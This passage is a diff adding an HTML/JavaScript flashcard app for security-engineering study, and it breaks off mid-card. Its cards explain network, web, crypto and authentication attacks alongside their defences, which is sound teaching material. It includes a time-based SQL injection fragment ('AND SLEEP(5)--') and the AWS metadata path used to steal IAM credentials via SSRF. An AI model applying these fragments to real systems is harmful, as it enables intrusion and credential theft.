@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Engineering — Flashcards</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Lora:ital,wght@0,400;1,400&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{font-size:16px;}
+body{
+  font-family:'Lora',Georgia,serif;
+  background:#ede8dc;
+  min-height:100vh;
+  color:#1c1208;
+  overflow-x:hidden;
+}
+
+/* paper grain overlay */
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.035'/%3E%3C/svg%3E");
+}
+
+/* ── HEADER ── */
+.hdr{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  height:52px;
+  background:rgba(237,232,220,0.93);
+  backdrop-filter:blur(10px);
+  border-bottom:1.5px solid #c4ae88;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 1.25rem;
+}
+.hdr-logo{
+  font-family:'Playfair Display',serif;
+  font-style:italic;font-size:1.05rem;
+  color:#5c3d0e;letter-spacing:.01em;white-space:nowrap;
+}
+.hdr-logo sup{
+  font-style:normal;font-family:'JetBrains Mono',monospace;
+  font-size:9px;letter-spacing:.08em;color:#a07840;
+  vertical-align:super;margin-left:4px;
+}
+.tab-row{display:flex;gap:2px;overflow-x:auto;scrollbar-width:none;}
+.tab-row::-webkit-scrollbar{display:none;}
+.tab{
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;letter-spacing:.06em;
+  padding:5px 12px;border:none;background:transparent;
+  color:#9a7040;cursor:pointer;white-space:nowrap;
+  border-bottom:2px solid transparent;transition:all .15s;
+}
+.tab:hover{color:#4a2a00;}
+.tab.on{color:#4a2a00;border-bottom-color:#7a4e10;}
+
+/* ── PROGRESS ── */
+.prog-strip{height:3px;background:#d5c8a8;position:relative;z-index:10;}
+.prog-fill{height:3px;background:#7a4e10;transition:width .4s ease;}
+
+/* ── DECK CHIPS ── */
+.chip-row{
+  display:flex;gap:6px;padding:8px 1.25rem;
+  overflow-x:auto;scrollbar-width:none;
+  border-bottom:1px solid #d0c0a0;
+  background:rgba(237,232,220,.75);
+  position:relative;z-index:10;
+}
+.chip-row::-webkit-scrollbar{display:none;}
+.chip{
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;letter-spacing:.05em;
+  padding:4px 12px;border-radius:2px;
+  border:1px solid #c4ae88;background:transparent;
+  color:#6a4820;cursor:pointer;white-space:nowrap;
+  transition:all .12s;
+}
+.chip:hover{border-color:#7a4e10;color:#3a1e00;}
+.chip.on{background:#7a4e10;border-color:#7a4e10;color:#f8f3e8;}
+
+/* ── STAGE ── */
+.stage{
+  position:relative;z-index:1;
+  padding:1.5rem 1rem 7rem;
+  display:flex;flex-direction:column;align-items:center;
+}
+
+/* ── DECK TITLE ── */
+.deck-title{
+  font-family:'Playfair Display',serif;font-style:italic;
+  font-size:1.35rem;color:#3a2000;
+  text-align:center;margin-bottom:.25rem;
+}
+.deck-sub{
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;color:#9a7040;letter-spacing:.07em;
+  text-align:center;margin-bottom:1.25rem;
+}
+
+/* ── FLASHCARD ── */
+/* 
+  KEY FIX: use a single card div (no 3D flip for now — height issues in mobile browsers).
+  Instead: slide/fade transition, show front or back based on a class.
+  This is more reliable cross-browser than backface-visibility.
+*/
+.card-wrap{
+  width:100%;max-width:660px;
+  position:relative;
+  margin-bottom:1.25rem;
+}
+
+.card{
+  width:100%;
+  border-radius:3px;
+  box-shadow:
+    0 1px 2px rgba(0,0,0,.07),
+    0 4px 12px rgba(0,0,0,.09),
+    0 16px 32px rgba(0,0,0,.06),
+    inset 0 0 0 1px rgba(196,174,136,.55);
+  position:relative;overflow:hidden;
+  transition:transform .08s ease;
+}
+.card:active{transform:scale(.992);}
+
+/* ruled lines on front */
+.card.front{
+  background:linear-gradient(158deg,#fffef8 0%,#f8f3e6 55%,#f2ebda 100%);
+  cursor:pointer;
+}
+.card.front::before{
+  content:'';position:absolute;inset:0;pointer-events:none;z-index:0;
+  background-image:repeating-linear-gradient(
+    transparent,transparent 31px,
+    rgba(160,130,80,.15) 31px,rgba(160,130,80,.15) 32px
+  );
+  background-position:0 64px;
+}
+.card.front::after{
+  /* red margin line */
+  content:'';position:absolute;top:0;bottom:0;left:54px;
+  width:1.5px;background:rgba(210,80,60,.22);pointer-events:none;z-index:0;
+}
+.card.back{
+  background:linear-gradient(158deg,#fefdf5 0%,#f5eedd 55%,#eee4cc 100%);
+  display:none;
+}
+.card.back.visible{display:block;}
+.card.front.hidden{display:none;}
+
+/* card inner padding */
+.card-inner{position:relative;z-index:1;padding:1.75rem 1.75rem 1.5rem;}
+
+/* ── CARD HEADER ── */
+.card-hdr{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:1.1rem;gap:8px;flex-wrap:wrap;
+}
+.tag{
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;font-weight:500;letter-spacing:.1em;
+  padding:3px 9px;border-radius:2px;
+}
+.tag-domain{
+  background:rgba(122,78,16,.08);color:#7a4e10;
+  border:1px solid rgba(122,78,16,.22);
+}
+.tag-deep{background:rgba(160,32,32,.08);color:#a02020;border:1px solid rgba(160,32,32,.22);}
+.tag-mid{background:rgba(140,90,10,.08);color:#8c5a0a;border:1px solid rgba(140,90,10,.22);}
+.tag-breadth{background:rgba(20,100,50,.08);color:#146432;border:1px solid rgba(20,100,50,.22);}
+.tag-code{background:rgba(40,40,150,.08);color:#282896;border:1px solid rgba(40,40,150,.22);}
+.tag-back{background:rgba(122,78,16,.06);color:#7a4e10;border:1px solid rgba(122,78,16,.2);font-size:9px;}
+
+/* ── QUESTION TEXT ── */
+.q-text{
+  font-family:'Playfair Display',serif;
+  font-size:clamp(1rem,2.2vw,1.18rem);
+  line-height:1.7;color:#1c1208;
+  white-space:pre-wrap;
+}
+
+/* ── HINT ── */
+.q-hint{
+  margin-top:1rem;
+  font-family:'Lora',serif;font-style:italic;
+  font-size:.8rem;color:#9a7040;line-height:1.55;
+}
+
+/* ── FLIP CUE ── */
+.flip-cue{
+  margin-top:1.1rem;
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;letter-spacing:.1em;color:#c0a060;
+  display:flex;align-items:center;gap:5px;
+  animation:breathe 2.8s ease-in-out infinite;
+}
+@keyframes breathe{0%,100%{opacity:.45}50%{opacity:1}}
+
+/* ── ANSWER ── */
+.ans-label{
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;letter-spacing:.12em;color:#7a4e10;
+  margin-bottom:.85rem;
+}
+.ans-text{
+  font-family:'Lora',serif;
+  font-size:.875rem;line-height:1.82;color:#241500;
+  white-space:pre-wrap;
+  max-height:55vh;overflow-y:auto;
+  padding-right:4px;
+}
+.ans-text::-webkit-scrollbar{width:3px;}
+.ans-text::-webkit-scrollbar-thumb{background:#c4ae88;border-radius:2px;}
+
+/* code block on back */
+.code-block{
+  margin-top:.85rem;
+  background:rgba(20,12,0,.06);
+  border:1px solid rgba(122,78,16,.18);
+  border-radius:2px;padding:.75rem 1rem;
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;line-height:1.7;color:#1c1208;
+  white-space:pre;overflow-x:auto;
+  max-height:300px;overflow-y:auto;
+}
+
+/* ── FOLLOW-UPS ── */
+.follow-wrap{
+  margin-top:1rem;padding-top:.85rem;
+  border-top:1px solid rgba(160,130,80,.3);
+}
+.follow-label{
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;letter-spacing:.12em;color:#9a7040;
+  margin-bottom:.45rem;
+}
+.follow-q{
+  font-family:'Lora',serif;font-style:italic;
+  font-size:.8rem;color:#5c3d0e;line-height:1.55;
+  padding:3px 0;
+}
+.follow-q::before{content:'→ ';color:#c4a060;}
+
+/* ── CONTROLS ── */
+.controls{
+  display:flex;align-items:center;
+  gap:8px;flex-wrap:wrap;justify-content:center;
+  margin-bottom:.75rem;
+}
+.btn{
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;letter-spacing:.06em;
+  padding:9px 18px;border-radius:2px;
+  border:1.5px solid #c4ae88;background:transparent;
+  color:#6a4820;cursor:pointer;transition:all .13s;white-space:nowrap;
+}
+.btn:hover{background:rgba(122,78,16,.08);border-color:#7a4e10;color:#3a1e00;}
+.btn:disabled{opacity:.22;cursor:not-allowed;}
+.btn.primary{background:#7a4e10;color:#f8f3e8;border-color:#7a4e10;}
+.btn.primary:hover{background:#5c3a0a;}
+.btn.flip{background:#5c3a0a;color:#f8f3e8;border-color:#5c3a0a;min-width:130px;}
+.btn.flip:hover{background:#7a4e10;}
+.ctr{
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;color:#9a7040;letter-spacing:.05em;min-width:56px;text-align:center;
+}
+
+/* ── RATINGS ── */
+.ratings{
+  display:flex;gap:8px;flex-wrap:wrap;justify-content:center;
+  margin-bottom:.75rem;
+  opacity:0;pointer-events:none;transition:opacity .25s;
+  min-height:36px;
+}
+.ratings.show{opacity:1;pointer-events:auto;}
+.rbtn{
+  font-family:'JetBrains Mono',monospace;font-size:10px;
+  letter-spacing:.05em;padding:7px 15px;border-radius:2px;
+  border:1.5px solid;cursor:pointer;background:transparent;
+  transition:all .13s;
+}
+.r-again{border-color:#b03030;color:#b03030;}
+.r-again:hover{background:rgba(176,48,48,.09);}
+.r-hard{border-color:#b07020;color:#b07020;}
+.r-hard:hover{background:rgba(176,112,32,.09);}
+.r-good{border-color:#207850;color:#207850;}
+.r-good:hover{background:rgba(32,120,80,.09);}
+.r-easy{border-color:#1848a0;color:#1848a0;}
+.r-easy:hover{background:rgba(24,72,160,.09);}
+
+/* ── STATS BAR ── */
+.stats-bar{
+  position:fixed;bottom:0;left:0;right:0;z-index:100;
+  background:rgba(237,232,220,.95);backdrop-filter:blur(10px);
+  border-top:1.5px solid #c4ae88;
+  display:flex;align-items:center;justify-content:center;
+  gap:1.5rem;padding:8px 1.25rem;flex-wrap:wrap;
+}
+.stat{
+  display:flex;align-items:center;gap:5px;
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;color:#7a5a2a;letter-spacing:.04em;
+}
+.dot{width:7px;height:7px;border-radius:50%;}
+.dot-a{background:#c04040;}.dot-h{background:#c07828;}.dot-g{background:#207850;}.dot-e{background:#1848a0;}
+.stat b{color:#3a2000;}
+.stat-sep{width:1px;height:16px;background:#c4ae88;}
+
+/* ── DONE SCREEN ── */
+.done-screen{
+  display:none;text-align:center;padding:2rem 1rem;
+  max-width:480px;margin:0 auto;
+}
+.done-screen.show{display:block;}
+.done-icon{font-size:2.5rem;margin-bottom:.75rem;}
+.done-title{
+  font-family:'Playfair Display',serif;font-style:italic;
+  font-size:1.75rem;color:#3a2000;margin-bottom:.35rem;
+}
+.done-sub{
+  font-family:'Lora',serif;font-style:italic;
+  color:#7a5a2a;margin-bottom:1.5rem;font-size:.9rem;
+}
+.score-row{
+  display:flex;gap:10px;justify-content:center;margin-bottom:1.5rem;flex-wrap:wrap;
+}
+.score-box{
+  background:rgba(255,255,255,.65);border:1px solid #d0c0a0;
+  border-radius:2px;padding:10px 16px;text-align:center;min-width:72px;
+}
+.score-n{
+  font-family:'Playfair Display',serif;font-size:1.85rem;
+  color:#3a2000;display:block;
+}
+.score-l{
+  font-family:'JetBrains Mono',monospace;
+  font-size:9px;letter-spacing:.08em;color:#9a7040;
+}
+
+@media(max-width:600px){
+  .hdr{padding:0 .85rem;}
+  .chip-row{padding:7px .85rem;}
+  .card-inner{padding:1.25rem 1.25rem 1.1rem;}
+  .card.front::after{left:36px;}
+  .stage{padding:1.25rem .75rem 7rem;}
+  .controls{gap:6px;}
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="hdr">
+  <div class="hdr-logo">Security Engineering<sup>FLASHCARDS</sup></div>
+  <div class="tab-row" id="tabRow"></div>
+</header>
+
+<!-- PROGRESS -->
+<div class="prog-strip"><div class="prog-fill" id="progFill" style="width:0%"></div></div>
+
+<!-- DECK CHIPS -->
+<div class="chip-row" id="chipRow"></div>
+
+<!-- STAGE -->
+<div class="stage" style="padding-top:112px;">
+
+  <div class="deck-title" id="deckTitle"></div>
+  <div class="deck-sub" id="deckSub"></div>
+
+  <div class="card-wrap" id="cardWrap">
+
+    <!-- FRONT -->
+    <div class="card front" id="cardFront" onclick="flip()">
+      <div class="card-inner">
+        <div class="card-hdr">
+          <span class="tag tag-domain" id="fDomain"></span>
+          <span class="tag" id="fDepth"></span>
+        </div>
+        <div class="q-text" id="fQuestion"></div>
+        <div class="q-hint" id="fHint" style="display:none;"></div>
+        <div class="flip-cue">↩ &nbsp;CLICK TO REVEAL ANSWER</div>
+      </div>
+    </div>
+
+    <!-- BACK -->
+    <div class="card back" id="cardBack">
+      <div class="card-inner">
+        <div class="card-hdr">
+          <span class="ans-label">ANSWER</span>
+          <span class="tag tag-back" id="bDomain"></span>
+        </div>
+        <div class="ans-text" id="bAnswer"></div>
+        <pre class="code-block" id="bCode" style="display:none;"></pre>
+        <div class="follow-wrap" id="bFollow" style="display:none;"></div>
+      </div>
+    </div>
+
+  </div><!-- card-wrap -->
+
+  <!-- RATINGS -->
+  <div class="ratings" id="ratings">
+    <button class="rbtn r-again" onclick="rate('again')">Again</button>
+    <button class="rbtn r-hard"  onclick="rate('hard')">Hard</button>
+    <button class="rbtn r-good"  onclick="rate('good')">Good</button>
+    <button class="rbtn r-easy"  onclick="rate('easy')">Easy</button>
+  </div>
+
+  <!-- NAV -->
+  <div class="controls" id="navCtrls">
+    <button class="btn" id="btnPrev" onclick="go(-1)">← PREV</button>
+    <span class="ctr" id="ctr"></span>
+    <button class="btn flip" id="btnFlip" onclick="flip()">FLIP CARD</button>
+    <span class="ctr" style="opacity:0">00/00</span>
+    <button class="btn primary" id="btnNext" onclick="go(1)">NEXT →</button>
+  </div>
+
+  <!-- DONE -->
+  <div class="done-screen" id="doneScreen">
+    <div class="done-icon">✦</div>
+    <div class="done-title">Deck Complete</div>
+    <div class="done-sub">Here's how you did this round</div>
+    <div class="score-row" id="scoreRow"></div>
+    <div class="controls">
+      <button class="btn primary" onclick="restart()">STUDY AGAIN</button>
+      <button class="btn" id="weakBtn" onclick="studyWeak()">STUDY WEAK ONLY</button>
+    </div>
+  </div>
+
+</div>
+
+<!-- STATS -->
+<div class="stats-bar">
+  <div class="stat"><div class="dot dot-a"></div>Again <b id="sA">0</b></div>
+  <div class="stat"><div class="dot dot-h"></div>Hard <b id="sH">0</b></div>
+  <div class="stat"><div class="dot dot-g"></div>Good <b id="sG">0</b></div>
+  <div class="stat"><div class="dot dot-e"></div>Easy <b id="sE">0</b></div>
+  <div class="stat-sep"></div>
+  <div class="stat">Remaining <b id="sR">0</b></div>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════
+// ALL FLASHCARD DATA
+// Source: gracenolan/Notes security engineering study guide
+// ════════════════════════════════════════════════════════
+
+const DECKS = {
+  Domain: [
+    {
+      label: "Networking",
+      cards: [
+        {id:"n01",domain:"Networking",depth:"mid",
+         question:"What are the 5 key OSI layers a security engineer must know, from top to bottom?",
+         hint:"Layer 7, 4, 3, 2, 1.",
+         answer:"Layer 7 – Application (HTTP, DNS, SMTP). Layer 4 – Transport (TCP, UDP). Layer 3 – Network (IP, ICMP). Layer 2 – Data Link (ARP, Ethernet). Layer 1 – Physical (cables, radio).",
+         followUps:["What attack lives at each layer?"]},
+
+        {id:"n02",domain:"Networking",depth:"mid",
+         question:"What attack targets Layer 2, and how does it work?",
+         hint:"ARP has no authentication.",
+         answer:"ARP poisoning. The attacker broadcasts fake ARP replies mapping their MAC address to another host's IP (e.g. the default gateway). All hosts update their ARP cache and send traffic to the attacker instead — a classic person-in-the-middle attack.",
+         followUps:["How do you detect ARP poisoning?","What is Dynamic ARP Inspection (DAI)?"]},
+
+        {id:"n03",domain:"Networking",depth:"mid",
+         question:"What attack targets Layer 4 (TCP), and how do SYN cookies mitigate it?",
+         hint:"Exploit the three-way handshake.",
+         answer:"SYN flood: the attacker sends SYN packets without completing the handshake, exhausting the server's half-open connection table. SYN cookies encode connection state into the sequence number, so the server doesn't allocate memory until the handshake completes — making the attack ineffective.",
+         followUps:["What is TCP session hijacking?"]},
+
+        {id:"n04",domain:"Networking",depth:"mid",
+         question:"What are the DNS record types every security engineer must know?",
+         hint:"A, AAAA, MX, NS, CNAME, PTR, TXT.",
+         answer:"A = IPv4 address. AAAA = IPv6 address. MX = mail server. NS = nameserver. CNAME = alias. PTR = reverse lookup (IP → name, stored backwards). TXT = arbitrary text, used for SPF, DKIM, domain verification.",
+         followUps:["How does a PTR record for 208.80.152.2 look?"]},
+
+        {id:"n05",domain:"Networking",depth:"deep",
+         question:"What is DNS exfiltration and why is it effective at bypassing controls?",
+         hint:"DNS uses UDP:53, not HTTP — so it doesn't appear in HTTP logs.",
+         answer:"Data is encoded into high-entropy subdomain strings of an attacker-controlled domain (e.g. base64data.evil.com). The DNS query carries the stolen data out. It bypasses egress HTTP controls because it's just DNS traffic on UDP port 53, which is almost never blocked.",
+         followUps:["What does a DNS sinkhole do?","How would you detect DNS exfiltration from logs?"]},
+
+        {id:"n06",domain:"Networking",depth:"mid",
+         question:"What is a DNS sinkhole and what does it achieve?",
+         hint:"Two jobs: block AND detect.",
+         answer:"A DNS sinkhole redirects queries for known-malicious domains to a controlled IP instead of the real destination. It serves two purposes: blocking outbound C2 communication, and identifying infected hosts — any host that queries the sinkholes domain is flagged as compromised.",
+         followUps:["What is passive DNS and how is it used in threat intel?"]},
+
+        {id:"n07",domain:"Networking",depth:"deep",
+         question:"What is Perfect Forward Secrecy (PFS) and why does it matter for passive collection operations?",
+         hint:"Compromising the private key later should not decrypt past sessions.",
+         answer:"PFS means each session uses an ephemeral key pair (ECDH) discarded after use. Compromising the server's long-term private key cannot decrypt previously recorded sessions. Without PFS, an attacker can record encrypted traffic now and decrypt it retroactively after obtaining the key. TLS 1.3 mandates PFS.",
+         followUps:["How does TLS 1.3 enforce PFS differently from TLS 1.2?"]},
+
+        {id:"n08",domain:"Networking",depth:"deep",
+         question:"What are POODLE, BEAST, and HEARTBLEED? One sentence each.",
+         hint:"Three major TLS/SSL vulnerabilities from 2011-2014.",
+         answer:"POODLE (2014): SSL 3.0 CBC padding oracle attack — attacker forces downgrade to SSL 3.0 and decrypts cookies. BEAST (2011): TLS 1.0 CBC chosen-plaintext attack on block cipher mode. HEARTBLEED (2014): OpenSSL memory disclosure — malformed heartbeat request leaks up to 64KB of heap, potentially including private keys.",
+         followUps:["What is a downgrade attack and how does HSTS prevent it?"]},
+
+        {id:"n09",domain:"Networking",depth:"mid",
+         question:"What is the difference between TCP and UDP and what are the security implications of each?",
+         hint:"TCP throttles on packet loss; UDP does not.",
+         answer:"TCP is reliable, ordered, and connection-oriented — enables SYN floods (exploiting the handshake) and session hijacking (predicting sequence numbers). UDP is connectionless and fast — enables DNS amplification attacks (small query → large spoofed response flood) and is harder to rate-limit.",
+         followUps:["Why can UDP streaming harm TCP connections on the same link?"]}
+      ]
+    },
+    {
+      label: "Web App",
+      cards: [
+        {id:"w01",domain:"Web App",depth:"mid",
+         question:"What does the Same-Origin Policy (SOP) prevent?",
+         hint:"It restricts reading, not sending.",
+         answer:"SOP prevents a script on one origin (scheme + host + port) from reading the response of a request to a different origin. It does NOT prevent the request from being sent — only the response from being read. This distinction is critical: CSRF exploits the fact that requests are still sent.",
+         followUps:["What does CORS allow that SOP restricts?","How does CSRF exploit the fact that SOP doesn't block requests?"]},
+
+        {id:"w02",domain:"Web App",depth:"deep",
+         question:"What is the dangerous CORS misconfiguration pattern and what does it allow an attacker to do?",
+         hint:"Reflecting the Origin header + Allow-Credentials: true.",
+         answer:"If a server sets Access-Control-Allow-Origin to whatever the request's Origin header says, and also sets Access-Control-Allow-Credentials: true, any attacker-controlled page can make credentialed cross-origin requests. The victim's browser sends their cookies automatically, and the attacker's page reads the full authenticated response.",
+         followUps:["What is the null origin trust issue in CORS?"]},
+
+        {id:"w03",domain:"Web App",depth:"deep",
+         question:"What is the difference between union-based and time-based blind SQL injection?",
+         hint:"Union-based requires visible output. Time-based works when there's no output at all.",
+         answer:"Union-based SQLi appends UNION SELECT to extract data from other tables — requires the results to be visible in the response. Time-based blind SQLi forces the database to sleep (e.g. AND SLEEP(5)--) if a condition is true — works when there's no visible output difference, inferring data character by character from response timing.",
+         followUps:["What is boolean-based blind SQLi?","Why are parameterised queries the correct prevention, not escaping?"]},
+
+        {id:"w04",domain:"Web App",depth:"deep",
+         question:"What makes DOM-based XSS different from reflected and stored XSS, and why do server-side scanners miss it?",
+         hint:"The payload never reaches the server.",
+         answer:"DOM-based XSS occurs entirely in the browser: client-side JavaScript reads attacker-controlled data (e.g. location.hash) and writes it to the DOM without sanitisation. The server's HTTP response is completely clean and never sees the payload. Server-side scanners and WAFs inspect server responses — they can't detect an attack that never touches the server.",
+         followUps:["Give an example of a DOM-based XSS sink and source.","What can XSS do if cookies are set to HttpOnly?"]},
+
+        {id:"w05",domain:"Web App",depth:"mid",
+         question:"HttpOnly cookies block document.cookie. Can XSS still lead to account takeover?",
+         hint:"HttpOnly only prevents reading the cookie via JS — not using it.",
+         answer:"Yes. The browser still sends HttpOnly cookies automatically on every HTTP request. Injected JavaScript can make authenticated fetch() or XMLHttpRequest calls on behalf of the victim — the browser attaches the session cookie automatically. The attacker can perform any authenticated action (password change, data export) without ever reading the cookie value.",
+         followUps:["What is DNS exfiltration from a browser context?","What is a BeEF hook?"]},
+
+        {id:"w06",domain:"Web App",depth:"deep",
+         question:"What is SSRF and what is the AWS metadata endpoint an attacker targets?",
+         hint:"169.254.169.254 — the link-local metadata service.",
+         answer:"SSRF (Server-Side Request Forgery) occurs when a server fetches a URL controlled by user input. Attackers pivot to http://169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve the attached IAM role name, then fetch that role's AccessKeyId, SecretAccessKey, and Token — live credentials valid for hours.",
+         followUps:["How does IMDSv2 mitigate SSRF?","What is the GCP equivalent of the AWS metadata endpoint?"]},
+
+        {id:"w07",domain:"Web App",depth:"mid",
+         question:"How does IMDSv2 mitigate SSRF attacks against the AWS instance metadata service?",
+         hint:"Requires a PUT request first — which simple GET-based SSRF cannot do.",
+         answer:"IMDSv2 requires the client to first make a PUT request with a TTL header to obtain a session token, then include that token as a header in the actual metadata request. A simple GET-based SSRF vulnerability cannot perform the PUT step, so the attacker cannot complete the flow and get credentials.",
+         followUps:["What is the GCP equivalent protection (Metadata-Flavor header)?"]},
+
+        {id:"w08",domain:"Web App",depth:"mid",
+         question:"What is CSRF and how does a CSRF token prevent it?",
+         hint:"SOP prevents the attacker from reading the token — that's the entire defence.",
+         answer:"CSRF tricks the victim's browser into making an authenticated request to a target site without their knowledge — the browser automatically sends cookies. A CSRF token is a random secret embedded in forms. The attacker's page cannot read the CSRF token from the target site (blocked by SOP), so it cannot include a valid token in the forged request.",
+         followUps:["What is the SameSite cookie attribute and how does it prevent CSRF?","Can CSRF exfiltrate data or only perform actions?"]}
+      ]
+    },
+    {
+      label: "Cryptography",
+      cards: [
+        {id:"c01",domain:"Cryptography",depth:"mid",
+         question:"What is the difference between encryption, hashing, and signing? One sentence each.",
+         hint:"Secrecy vs integrity vs authenticity.",
+         answer:"Encryption provides secrecy — reversible with a key. Hashing provides integrity — one-way, fixed-length fingerprint. Signing provides authenticity — proves the sender holds a private key by signing a hash with it, verified with the corresponding public key.",
+         followUps:["What is the difference between symmetric and asymmetric encryption?","What is encoding and why is it not a security control?"]},
+
+        {id:"c02",domain:"Cryptography",depth:"deep",
+         question:"Why is MD5 or unsalted SHA-256 wrong for storing passwords, and what should you use instead?",
+         hint:"Fast + no salt = two separate problems.",
+         answer:"MD5 and SHA-256 are designed to be fast — GPUs can compute billions of hashes per second, making brute-force trivial. Without a salt, identical passwords produce identical hashes, enabling rainbow table attacks. Use bcrypt, scrypt, or Argon2id — they are intentionally slow (tunable work factor), include a per-password salt, and Argon2id is memory-hard, making GPU attacks expensive.",
+         followUps:["What is a rainbow table and how does a salt defeat it?","What is Argon2's memory-hardness and why does it matter?"]},
+
+        {id:"c03",domain:"Cryptography",depth:"mid",
+         question:"What is wrong with ECB mode for block cipher encryption?",
+         hint:"The ECB penguin — identical plaintext blocks produce identical ciphertext.",
+         answer:"ECB (Electronic Codebook) encrypts each block independently with the same key. Identical plaintext blocks always produce identical ciphertext blocks, revealing the structure and patterns of the original data. The classic demonstration is encrypting a bitmap image in ECB — the shape is still clearly visible in the ciphertext.",
+         followUps:["What is GCM mode and why is it preferred?","What is an IV and what happens if you reuse one in CTR mode?"]},
+
+        {id:"c04",domain:"Cryptography",depth:"mid",
+         question:"What is AES-GCM and why is it the recommended symmetric encryption mode?",
+         hint:"AEAD — it provides both confidentiality AND integrity.",
+         answer:"AES-GCM is an AEAD (Authenticated Encryption with Associated Data) mode. It combines AES-CTR for encryption with a GHASH authentication tag. The authentication tag detects any tampering with the ciphertext — an attacker who modifies the ciphertext produces an invalid tag, and decryption fails. Unauthenticated modes (CBC, CTR alone) don't detect tampering.",
+         followUps:["What is the difference between authenticated and unauthenticated encryption?"]},
+
+        {id:"c05",domain:"Cryptography",depth:"deep",
+         question:"What is PKI and how does certificate validation work step by step?",
+         hint:"5 checks: CA trust, signature, validity period, revocation, hostname.",
+         answer:"PKI manages digital certificates that enable trust between unknown parties. Certificate validation: (1) Is the signing CA in my trust store? (2) Is the CA's signature on the cert cryptographically valid? (3) Is the cert within its validity period? (4) Is the cert revoked? (via CRL or OCSP) (5) Does the hostname match the Subject Alternative Names?",
+         followUps:["What happened at DigiNotar and why was it catastrophic?","What is Certificate Transparency?"]},
+
+        {id:"c06",domain:"Cryptography",depth:"mid",
+         question:"What happened at DigiNotar and what was the systemic lesson?",
+         hint:"One compromised CA broke trust for every domain it could sign.",
+         answer:"DigiNotar, a Dutch CA, was compromised in 2011. Attackers issued fraudulent certificates for google.com, yahoo.com, and CIA.gov, used to intercept Gmail of ~300,000 Iranian users. Once discovered, DigiNotar was removed from all browser trust stores within days and went bankrupt. The lesson: a single compromised CA breaks the trust model for every domain it can sign for.",
+         followUps:["What is Certificate Transparency and how does it prevent this?","What is HPKP and why was it deprecated?"]},
+
+        {id:"c07",domain:"Cryptography",depth:"mid",
+         question:"What is HMAC and how does it differ from a plain cryptographic hash?",
+         hint:"A MAC adds a secret key to a hash — it proves both integrity AND authenticity.",
+         answer:"HMAC (Hash-based Message Authentication Code) is computed as HMAC(key, message) = Hash(key ⊕ opad || Hash(key ⊕ ipad || message)). Unlike a plain hash which anyone can compute, HMAC requires the secret key. It proves both integrity (the message wasn't tampered with) and authenticity (only someone with the key could have produced it). Used for API signatures, JWT signing (HS256), and webhook verification.",
+         followUps:["What is a timing attack on HMAC comparison and how does hmac.compare_digest() prevent it?"]}
+      ]
+    },
+    {
+      label: "Authentication",
+      cards: [
+        {id:"a01",domain:"Authentication",depth:"deep",
+         question:"What is the core security trade-off between session-based and JWT authentication?",
+         hint:"Sessions = easy revocation. JWTs = hard revocation.",
+         answer:"Sessions store state server-side — a session can be instantly revoked by deleting the record. JWTs are self-contained and stateless — the server validates only the signature and expiry, requiring no DB lookup. The trade-off: JWTs cannot be revoked before expiry without a blocklist (which makes them stateful again). For security-critical operations, prefer sessions or short-lived JWTs with a revocation check.",
+         followUps:["What is the JWT alg:none attack?","What is the RS256→HS256 algorithm confusion attack?"]},
+
+        {id:"a02",domain:"Authentication",depth:"deep",
+         question:"What is the JWT alg:none attack?",
+         hint:"What happens if the library accepts 'none' as a valid algorithm?",
+         answer:"If a JWT library accepts alg:none (no signature), an attacker can craft a token with any claims, set the algorithm to 'none', and omit the signature entirely. Vulnerable libraries decode the token as valid. Fix: the server must enforce a strict allowlist of accepted algorithms and never accept alg:none.",
+         followUps:["What is the RS256→HS256 algorithm confusion attack?"]},
+
+        {id:"a03",domain:"Authentication",depth:"deep",
+         question:"What is the RS256→HS256 JWT algorithm confusion attack?",
+         hint:"What happens if you use the server's public key as an HMAC secret?",
+         answer:"RS256 uses a private key to sign and the public key to verify. HS256 uses the same secret for both signing and verification. If an attacker changes the alg header from RS256 to HS256 and signs the token with the server's public key (which is often publicly available), a vulnerable server will verify the HS256 signature using the public key — successfully validating the forged token.",
+         followUps:["How do you prevent this? (Enforce algorithm allowlist server-side)"]},
+
+        {id:"a04",domain:"Authentication",depth:"deep",
+         question:"Why is U2F/FIDO2 phishing-resistant when TOTP is not?",
+         hint:"The origin domain is cryptographically bound to the signed challenge.",
+         answer:"When a FIDO2 key performs authentication, it signs a challenge that includes the origin domain of the site requesting auth. A phishing site at evil-bank.com gets a signed response that includes that domain — which won't validate on the real bank.com server. TOTP codes, by contrast, are just numbers with no binding to the site they're submitted to. A real-time phishing proxy can forward a valid TOTP before it expires.",
+         followUps:["What is an MFA fatigue attack and how do you defend against it?"]},
+
+        {id:"a05",domain:"Authentication",depth:"mid",
+         question:"What is an MFA fatigue attack and how do you defend against it?",
+         hint:"Push notification spamming until the user gives up and approves.",
